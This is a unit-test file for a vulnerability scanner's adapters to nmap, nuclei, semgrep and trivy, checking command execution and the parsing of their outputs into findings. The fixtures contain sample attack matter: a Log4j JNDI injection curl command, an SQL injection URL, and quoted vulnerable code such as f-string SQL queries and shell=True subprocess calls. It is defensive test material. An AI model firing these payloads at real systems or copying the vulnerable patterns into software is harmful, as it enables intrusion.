"""
Unit Tests for Pluggable Hybrid External Tool Adapters Layer (Chunk 2).
Contracts: 03 (Section 4), 06 (Section 2), 08 (Section 8).
"""

import asyncio
import json
import os
import shutil
import pytest
from unittest.mock import AsyncMock, patch, MagicMock

from app.core.models import (
    Target,
    TargetType,
    ScanConfig,
    LogLevel,
    Severity,
    ToolAdapterConfig,
    ToolExecutionMode,
)
from app.adapters.base_adapter import BaseToolAdapter
from app.adapters.nmap_adapter import NmapAdapter, extract_host
from app.adapters.nuclei_adapter import NucleiAdapter, normalize_target_url
from app.adapters.semgrep_adapter import SemgrepAdapter
from app.adapters.trivy_adapter import TrivyAdapter
from app.adapters import get_adapter_registry, discover_system_capabilities


# ============================================================================
# Dummy Concrete Adapter for Base Class Testing
# ============================================================================

class DummyAdapter(BaseToolAdapter):
    @property
    def tool_name(self) -> str:
        return "dummy_tool"

    async def get_version(self, custom_path=None):
        return "dummy 1.0.0"

    async def run(self, target, config, emit_log, emit_finding, **kwargs):
        return []


# ============================================================================
# 1. BaseToolAdapter Tests
# ============================================================================

class TestBaseToolAdapter:
    def test_resolve_binary_path(self, tmp_path):
        adapter = DummyAdapter()

        # Fallback to system PATH
        with patch("shutil.which", return_value="/usr/bin/dummy_tool"):
            resolved = adapter.resolve_binary_path()
            assert resolved == "/usr/bin/dummy_tool"

        # Custom path directly pointing to an existing file
        dummy_file = tmp_path / "dummy_tool.exe"
        dummy_file.write_text("binary content")
        resolved_custom = adapter.resolve_binary_path(str(dummy_file))
        assert resolved_custom == str(dummy_file.resolve())

        # Custom path as command name found via shutil.which
        with patch("shutil.which", side_effect=lambda name: f"/opt/bin/{name}" if name == "custom_bin" else None):
            resolved_which = adapter.resolve_binary_path("custom_bin")
            assert resolved_which == "/opt/bin/custom_bin"

    @pytest.mark.asyncio
    async def test_is_available(self, tmp_path):
        adapter = DummyAdapter()
        dummy_file = tmp_path / "dummy_bin"
        dummy_file.write_text("dummy")

        assert await adapter.is_available(str(dummy_file)) is True

        with patch("shutil.which", return_value=None):
            assert await adapter.is_available(None) is False

    @pytest.mark.asyncio
    async def test_execute_command_success(self):
        adapter = DummyAdapter()
        code, stdout, stderr = await adapter.execute_command(
            ["python", "-c", "import sys; print('hello'); sys.stderr.write('warn')"],
            timeout=5.0,
        )
        assert code == 0
        assert "hello" in stdout
        assert "warn" in stderr

    @pytest.mark.asyncio
    async def test_execute_command_empty(self):
        adapter = DummyAdapter()
        code, stdout, stderr = await adapter.execute_command([], timeout=5.0)
        assert code == -1
        assert "Empty" in stderr

    @pytest.mark.asyncio
    async def test_execute_command_timeout(self):
        adapter = DummyAdapter()
        logs = []
        async def mock_log(lvl, msg):
            logs.append((lvl, msg))

        code, stdout, stderr = await adapter.execute_command(
            ["python", "-c", "import time; time.sleep(10)"],
            timeout=0.2,
            emit_log=mock_log,
        )
        assert code == -1
        assert "timed out" in stderr
        assert any(l[0] == LogLevel.WARNING for l in logs)

    @pytest.mark.asyncio
    async def test_execute_command_nonexistent_binary(self):
        adapter = DummyAdapter()
        code, stdout, stderr = await adapter.execute_command(
            ["non_existent_binary_xyz_12345"],
            timeout=2.0,
        )
        assert code in (127, -1)


# ============================================================================
# 2. NmapAdapter Tests
# ============================================================================

NMAP_SAMPLE_XML = """<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap" version="7.94">
<host>
    <status state="up"/>
    <address addr="192.168.1.50" addrtype="ipv4"/>
    <ports>
        <port protocol="tcp" portid="21">
            <state state="open"/>
            <service name="ftp" product="vsftpd" version="3.0.3"/>
        </port>
        <port protocol="tcp" portid="80">
            <state state="closed"/>
        </port>
        <port protocol="tcp" portid="3306">
            <state state="open"/>
            <service name="mysql" product="MySQL" version="8.0.35"/>
        </port>
        <port protocol="tcp" portid="6379">
            <state state="open"/>
            <service name="redis" product="Redis key-value store" version="7.0.12"/>
        </port>
        <port protocol="tcp" portid="8080">
            <state state="open"/>
            <service name="http" product="Apache Tomcat" version="9.0.50"/>
            <script id="http-title" output="Apache Tomcat/9.0.50 Error Report"/>
        </port>
    </ports>
</host>
</nmaprun>
"""

class TestNmapAdapter:
    def test_extract_host(self):
        assert extract_host("https://example.com:8443/test") == "example.com"
        assert extract_host("192.168.1.1:8080") == "192.168.1.1"
        assert extract_host("scanme.nmap.org") == "scanme.nmap.org"

    @pytest.mark.asyncio
    async def test_get_version(self):
        adapter = NmapAdapter()
        with patch.object(adapter, "resolve_binary_path", return_value="/usr/bin/nmap"):
            with patch.object(adapter, "execute_command", return_value=(0, "Nmap version 7.94 ( https://nmap.org )\nPlatform: x86_64", "")):
                ver = await adapter.get_version()
                assert ver == "Nmap 7.94"

    @pytest.mark.asyncio
    async def test_run_parsing_and_findings(self):
        adapter = NmapAdapter()
        target = Target(name="Test Target", type=TargetType.DOMAIN, value="192.168.1.50")
        config = ScanConfig(port_list=[21, 80, 3306, 6379, 8080])

        logs = []
        findings = []

        async def mock_log(lvl, msg):
            logs.append((lvl, msg))

        async def mock_finding(f):
            findings.append(f)

        with patch.object(adapter, "resolve_binary_path", return_value="/usr/bin/nmap"):
            with patch.object(adapter, "execute_command", return_value=(0, NMAP_SAMPLE_XML, "")):
                res = await adapter.run(target, config, mock_log, mock_finding)

        assert len(res) == 4  # Port 80 was closed, so 4 open ports
        assert len(findings) == 4

        check_ids = [f.check_id for f in res]
        assert "NET-PORT-003" in check_ids  # FTP 21
        assert "NET-PORT-001" in check_ids  # MySQL 3306
        assert "NET-PORT-002" in check_ids  # Redis 6379
        assert "NET-SVC-001" in check_ids   # Tomcat 8080

        ftp_finding = next(f for f in res if f.check_id == "NET-PORT-003")
        assert ftp_finding.source_tool == "nmap"
        assert ftp_finding.severity == Severity.HIGH
        assert ftp_finding.cvss_score == 7.5
        assert "192.168.1.50:21" in ftp_finding.evidence.location

        tomcat_finding = next(f for f in res if f.check_id == "NET-SVC-001")
        assert "Apache Tomcat" in tomcat_finding.evidence.observed_value
        assert "http-title" in tomcat_finding.evidence.raw_response_snippet

    @pytest.mark.asyncio
    async def test_run_missing_binary(self):
        adapter = NmapAdapter()
        target = Target(name="Test Target", type=TargetType.DOMAIN, value="example.com")
        config = ScanConfig()

        logs = []
        async def mock_log(lvl, msg): logs.append((lvl, msg))
        async def mock_finding(f): pass

        with patch.object(adapter, "resolve_binary_path", return_value=None):
            res = await adapter.run(target, config, mock_log, mock_finding)
            assert res == []
            assert any("not found" in l[1] for l in logs)

    @pytest.mark.asyncio
    async def test_run_invalid_xml(self):
        adapter = NmapAdapter()
        target = Target(name="Test Target", type=TargetType.DOMAIN, value="example.com")
        config = ScanConfig()

        logs = []
        async def mock_log(lvl, msg): logs.append((lvl, msg))
        async def mock_finding(f): pass

        with patch.object(adapter, "resolve_binary_path", return_value="/usr/bin/nmap"):
            with patch.object(adapter, "execute_command", return_value=(0, "MALFORMED XML <><>", "")):
                res = await adapter.run(target, config, mock_log, mock_finding)
                assert res == []
                assert any("Failed to parse" in l[1] for l in logs)


# ============================================================================
# 3. NucleiAdapter Tests
# ============================================================================

NUCLEI_SAMPLE_JSONL = """
{"template-id":"cve-2021-44228","info":{"name":"Apache Log4j RCE","severity":"critical","classification":{"cwe-id":["CWE-502"]},"description":"Apache Log4j2 JNDI RCE vulnerability"},"matched-at":"https://target.example.com/login","curl-command":"curl -X POST https://target.example.com/login -H 'X-Api-Version: ${jndi:ldap://test}'"}
{"template-id":"sql-injection-error-based","info":{"name":"SQL Injection Error Based","severity":"high","classification":{"cwe-id":["CWE-89"]}},"matched-at":"https://target.example.com/items?id=1'"}
{"template-id":"cors-misconfig","info":{"name":"CORS Arbitrary Origin","severity":"medium","classification":{"cwe-id":["CWE-942"]}},"matched-at":"https://target.example.com/api"}
{"template-id":"env-file-exposure","info":{"name":"Environment Variable File Exposure","severity":"critical","classification":{"cwe-id":["CWE-552"]}},"matched-at":"https://target.example.com/.env"}
"""

class TestNucleiAdapter:
    def test_normalize_target_url(self):
        assert normalize_target_url("http://example.com") == "http://example.com"
        assert normalize_target_url("https://example.com") == "https://example.com"
        assert normalize_target_url("example.com") == "https://example.com"

    @pytest.mark.asyncio
    async def test_get_version(self):
        adapter = NucleiAdapter()
        with patch.object(adapter, "resolve_binary_path", return_value="/usr/bin/nuclei"):
            with patch.object(adapter, "execute_command", return_value=(0, "[INF] Current Version: v3.2.0", "")):
                ver = await adapter.get_version()
                assert ver == "nuclei v3.2.0"

    @pytest.mark.asyncio
    async def test_run_parsing_and_findings(self):
        adapter = NucleiAdapter()
        target = Target(name="Web Target", type=TargetType.URL, value="https://target.example.com")
        config = ScanConfig()

        findings = []
        async def mock_log(lvl, msg): pass
        async def mock_finding(f): findings.append(f)

        with patch.object(adapter, "resolve_binary_path", return_value="/usr/bin/nuclei"):
            with patch.object(adapter, "execute_command", return_value=(0, NUCLEI_SAMPLE_JSONL.strip(), "")):
                res = await adapter.run(target, config, mock_log, mock_finding)

        assert len(res) == 4
        assert len(findings) == 4

        sqli = next(f for f in res if f.check_id == "DAST-INJ-001")
        assert sqli.severity == Severity.HIGH
        assert sqli.cvss_score == 7.5
        assert sqli.source_tool == "nuclei"
        assert sqli.cwe_id == "CWE-89"

        log4j = next(f for f in res if "cve-2021-44228" in f.title)
        assert log4j.severity == Severity.CRITICAL
        assert log4j.cvss_score == 9.8
        assert log4j.reproduction_curl is not None
        assert "jndi:ldap" in log4j.reproduction_curl

        env_exp = next(f for f in res if "env-file-exposure" in f.title)
        assert env_exp.severity == Severity.CRITICAL
        assert "https://target.example.com/.env" in env_exp.evidence.location


# ============================================================================
# 4. SemgrepAdapter Tests
# ============================================================================

SEMGREP_SAMPLE_JSON = {
    "results": [
        {
            "check_id": "python.lang.security.injection.sql.formatted-sql-query",
            "path": "backend/app/db.py",
            "start": {"line": 42, "col": 5},
            "extra": {
                "message": "User input directly formatted into raw SQL query execution.",
                "severity": "ERROR",
                "lines": "cursor.execute(f'SELECT * FROM users WHERE id={user_id}')",
                "metadata": {"cwe": ["CWE-89: SQL Injection"]},
            },
        },
        {
            "check_id": "python.lang.security.audit.dangerous-subprocess-use",
            "path": "backend/app/runner.py",
            "start": {"line": 15, "col": 1},
            "extra": {
                "message": "subprocess called with shell=True and dynamic arguments.",
                "severity": "ERROR",
                "lines": "subprocess.Popen(cmd, shell=True)",
                "metadata": {"cwe": ["CWE-78: OS Command Injection"]},
            },
        },
        {
            "check_id": "generic.secrets.security.hardcoded-aws-secret-key",
            "path": "config/settings.py",
            "start": {"line": 8, "col": 10},
            "extra": {
                "message": "Hardcoded AWS secret key detected.",
                "severity": "WARNING",
                "lines": "AWS_SECRET = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'",
                "metadata": {"cwe": ["CWE-798: Hard-coded Credentials"]},
            },
        },
        {
            "check_id": "python.cryptography.security.insecure-hash-md5",
            "path": "backend/app/auth.py",
            "start": {"line": 88, "col": 4},
            "extra": {
                "message": "Insecure MD5 hashing used.",
                "severity": "WARNING",
                "lines": "hashlib.md5(password.encode()).hexdigest()",
                "metadata": {"cwe": ["CWE-327: Use of a Broken or Risky Cryptographic Algorithm"]},
            },
        },
    ]
}

class TestSemgrepAdapter:
    @pytest.mark.asyncio
    async def test_get_version(self):
        adapter = SemgrepAdapter()
        with patch.object(adapter, "resolve_binary_path", return_value="/usr/bin/semgrep"):
            with patch.object(adapter, "execute_command", return_value=(0, "1.60.0\n", "")):
                ver = await adapter.get_version()
                assert ver == "semgrep 1.60.0"

    @pytest.mark.asyncio
    async def test_run_parsing_and_findings(self):
        adapter = SemgrepAdapter()
        target = Target(name="Code Repo", type=TargetType.LOCAL_PATH, value="./src")
        config = ScanConfig()

        findings = []
        async def mock_log(lvl, msg): pass
        async def mock_finding(f): findings.append(f)

        with patch.object(adapter, "resolve_binary_path", return_value="/usr/bin/semgrep"):
            with patch.object(adapter, "execute_command", return_value=(0, json.dumps(SEMGREP_SAMPLE_JSON), "")):
                res = await adapter.run(target, config, mock_log, mock_finding)

        assert len(res) == 4
        assert len(findings) == 4

        sqli = next(f for f in res if f.check_id == "SAST-TAINT-001")
        assert sqli.source_tool == "semgrep"
        assert sqli.severity == Severity.CRITICAL
        assert sqli.cvss_score == 9.8
        assert sqli.evidence.line_number == 42
        assert "backend/app/db.py:42" in sqli.evidence.location

        cmd_inj = next(f for f in res if f.check_id == "SAST-TAINT-002")
        assert cmd_inj.severity == Severity.CRITICAL
        assert cmd_inj.cwe_id == "CWE-78"

        secret = next(f for f in res if f.check_id == "SAST-SEC-001")
        assert secret.severity == Severity.HIGH
        assert secret.cwe_id == "CWE-798"

        crypto = next(f for f in res if f.check_id == "SAST-CRY-001")
        assert crypto.severity == Severity.MEDIUM
        assert crypto.cwe_id == "CWE-327"


# ============================================================================
# 5. TrivyAdapter Tests
# ============================================================================

TRIVY_SAMPLE_JSON = {
    "Results": [
        {
            "Target": "requirements.txt",
            "Class": "lang-pkgs",
            "Vulnerabilities": [
                {
                    "VulnerabilityID": "CVE-2023-32681",
                    "PkgName": "requests",
                    "InstalledVersion": "2.28.0",
                    "FixedVersion": "2.31.0",
                    "Severity": "HIGH",
                    "Title": "Unintended leak of Proxy-Authorization header in requests",
                    "Description": "Requests forwards Proxy-Authorization header to destination.",
                    "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2023-32681",
                    "CweIDs": ["CWE-200"],
                    "CVSS": {"nvd": {"V3Score": 7.5}},
                }
            ],
        },
        {
            "Target": "Dockerfile",
            "Class": "config",
            "Misconfigurations": [
                {
                    "ID": "DS002",
                    "Title": "Image user should not be 'root'",
                    "Severity": "HIGH",
                    "Description": "Running containers as root poses privilege escalation risks.",
                    "Resolution": "Specify USER nonroot in Dockerfile.",
                    "PrimaryURL": "https://avd.aquasec.com/misconfig/ds002",
                }
            ],
        },
    ]
}

class TestTrivyAdapter:
    @pytest.mark.asyncio
    async def test_get_version(self):
        adapter = TrivyAdapter()
        with patch.object(adapter, "resolve_binary_path", return_value="/usr/bin/trivy"):
            with patch.object(adapter, "execute_command", return_value=(0, "Version: 0.50.0\n", "")):
                ver = await adapter.get_version()
                assert ver == "trivy 0.50.0"

    @pytest.mark.asyncio
    async def test_run_parsing_and_findings(self):
        adapter = TrivyAdapter()
        target = Target(name="Project Files", type=TargetType.LOCAL_PATH, value=".")
        config = ScanConfig()

        findings = []
        async def mock_log(lvl, msg): pass
        async def mock_finding(f): findings.append(f)

        with patch.object(adapter, "resolve_binary_path", return_value="/usr/bin/trivy"):
            with patch.object(adapter, "execute_command", return_value=(0, json.dumps(TRIVY_SAMPLE_JSON), "")):
                res = await adapter.run(target, config, mock_log, mock_finding)

        assert len(res) == 2
        assert len(findings) == 2

        sca = next(f for f in res if f.check_id == "SAST-DEP-001")
        assert sca.source_tool == "trivy"
        assert sca.severity == Severity.HIGH
        assert sca.cvss_score == 7.5
        assert "requests@2.28.0" in sca.evidence.location
        assert "2.31.0" in sca.remediation

        dock = next(f for f in res if f.check_id == "IAC-DOCK-001")
        assert dock.source_tool == "trivy"
        assert dock.engine == "infra_iac"
        assert dock.severity == Severity.HIGH
        assert "root" in dock.title.lower()


# ============================================================================
# 6. Adapter Registry & Capabilities Discovery Tests
# ============================================================================

class TestCapabilitiesAndRegistry:
    def test_adapter_registry(self):
        registry = get_adapter_registry()
        assert set(registry.keys()) == {"nmap", "nuclei", "semgrep", "trivy"}
        assert isinstance(registry["nmap"], NmapAdapter)
        assert isinstance(registry["nuclei"], NucleiAdapter)
        assert isinstance(registry["semgrep"], SemgrepAdapter)
        assert isinstance(registry["trivy"], TrivyAdapter)

    @pytest.mark.asyncio
    async def test_discover_system_capabilities_fallback(self):
        # All tools missing -> NATIVE_FALLBACK
        with patch.object(BaseToolAdapter, "resolve_binary_path", return_value=None):
            with patch.object(BaseToolAdapter, "is_available", return_value=False):
                caps = await discover_system_capabilities()
                assert len(caps.tools) == 4
                assert caps.native_engines_ready is True
                for t in caps.tools:
                    assert t.available is False
                    assert t.execution_mode == ToolExecutionMode.NATIVE_FALLBACK

    @pytest.mark.asyncio
    async def test_discover_system_capabilities_active(self):
        # Nmap and Semgrep available, Nuclei and Trivy missing
        mock_nmap = MagicMock(spec=NmapAdapter)
        mock_nmap.tool_name = "nmap"
        mock_nmap.resolve_binary_path.return_value = "/usr/bin/nmap"
        mock_nmap.is_available = AsyncMock(return_value=True)
        mock_nmap.get_version = AsyncMock(return_value="Nmap 7.94")

        mock_semgrep = MagicMock(spec=SemgrepAdapter)
        mock_semgrep.tool_name = "semgrep"
        mock_semgrep.resolve_binary_path.return_value = "/usr/bin/semgrep"
        mock_semgrep.is_available = AsyncMock(return_value=True)
        mock_semgrep.get_version = AsyncMock(return_value="semgrep 1.60.0")

        mock_nuclei = MagicMock(spec=NucleiAdapter)
        mock_nuclei.tool_name = "nuclei"
        mock_nuclei.resolve_binary_path.return_value = None
        mock_nuclei.is_available = AsyncMock(return_value=False)
        mock_nuclei.get_version = AsyncMock(return_value=None)

        mock_trivy = MagicMock(spec=TrivyAdapter)
        mock_trivy.tool_name = "trivy"
        mock_trivy.resolve_binary_path.return_value = None
        mock_trivy.is_available = AsyncMock(return_value=False)
        mock_trivy.get_version = AsyncMock(return_value=None)

        mock_registry = {
            "nmap": mock_nmap,
            "nuclei": mock_nuclei,
            "semgrep": mock_semgrep,
            "trivy": mock_trivy,
        }

        with patch("app.adapters.get_adapter_registry", return_value=mock_registry):
            caps = await discover_system_capabilities()
            tool_map = {t.name: t for t in caps.tools}

            assert tool_map["nmap"].available is True
            assert tool_map["nmap"].execution_mode == ToolExecutionMode.ADAPTER_ACTIVE
            assert tool_map["nmap"].version == "Nmap 7.94"

            assert tool_map["semgrep"].available is True
            assert tool_map["semgrep"].execution_mode == ToolExecutionMode.ADAPTER_ACTIVE
            assert tool_map["semgrep"].version == "semgrep 1.60.0"

            assert tool_map["nuclei"].available is False
            assert tool_map["nuclei"].execution_mode == ToolExecutionMode.NATIVE_FALLBACK

            assert tool_map["trivy"].available is False
            assert tool_map["trivy"].execution_mode == ToolExecutionMode.NATIVE_FALLBACK

    @pytest.mark.asyncio
    async def test_discover_system_capabilities_disabled(self):
        # Explicitly disable nmap and nuclei via config
        config = ToolAdapterConfig(
            enable_nmap=False,
            enable_nuclei=False,
            enable_semgrep=True,
            enable_trivy=True,
        )

        mock_nmap = MagicMock(spec=NmapAdapter)
        mock_nmap.tool_name = "nmap"
        mock_nmap.resolve_binary_path.return_value = "/usr/bin/nmap"
        mock_nmap.is_available = AsyncMock(return_value=True)
        mock_nmap.get_version = AsyncMock(return_value="Nmap 7.94")

        mock_nuclei = MagicMock(spec=NucleiAdapter)
        mock_nuclei.tool_name = "nuclei"
        mock_nuclei.resolve_binary_path.return_value = "/usr/bin/nuclei"
        mock_nuclei.is_available = AsyncMock(return_value=True)
        mock_nuclei.get_version = AsyncMock(return_value="nuclei v3.2.0")

        mock_semgrep = MagicMock(spec=SemgrepAdapter)
        mock_semgrep.tool_name = "semgrep"
        mock_semgrep.resolve_binary_path.return_value = "/usr/bin/semgrep"
        mock_semgrep.is_available = AsyncMock(return_value=True)
        mock_semgrep.get_version = AsyncMock(return_value="semgrep 1.60.0")

        mock_trivy = MagicMock(spec=TrivyAdapter)
        mock_trivy.tool_name = "trivy"
        mock_trivy.resolve_binary_path.return_value = "/usr/bin/trivy"
        mock_trivy.is_available = AsyncMock(return_value=True)
        mock_trivy.get_version = AsyncMock(return_value="trivy 0.50.0")

        mock_registry = {
            "nmap": mock_nmap,
            "nuclei": mock_nuclei,
            "semgrep": mock_semgrep,
            "trivy": mock_trivy,
        }

        with patch("app.adapters.get_adapter_registry", return_value=mock_registry):
            caps = await discover_system_capabilities(config=config)
            tool_map = {t.name: t for t in caps.tools}

            assert tool_map["nmap"].execution_mode == ToolExecutionMode.DISABLED
            assert tool_map["nmap"].available is False

            assert tool_map["nuclei"].execution_mode == ToolExecutionMode.DISABLED
            assert tool_map["nuclei"].available is False

            assert tool_map["semgrep"].execution_mode == ToolExecutionMode.ADAPTER_ACTIVE
            assert tool_map["semgrep"].available is True

